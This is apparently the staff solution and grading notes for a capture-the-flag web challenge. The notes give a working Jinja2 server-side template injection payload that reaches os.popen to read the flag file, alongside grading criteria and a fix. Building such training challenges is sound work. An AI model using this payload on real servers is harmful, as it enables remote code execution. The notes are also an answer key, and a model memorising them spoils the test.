# inj3 (OpsBoard) — intended solution & staff notes

## Path
1. Recon: `POST /report` header `{{ 7 * 7 }}` → the page shows `49`
   (server-side template injection confirmed).
2. RCE: header
   `{{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}`
   → the flag renders into the report preview.

## Grading discriminators
- Distinguishes SSTI from XSS: the marks execute **server-side** (the
  arithmetic test is the discriminator).
- Explains the payload mechanics (jinja2 default globals → module globals →
  `os.popen`), or at least finds an equivalent RCE chain.
- Fix: render user text as **data**, not as a template (escape it / use a
  fixed template with a data slot); if template features are wanted, a
   sandboxed environment with a strict allowlist of globals.
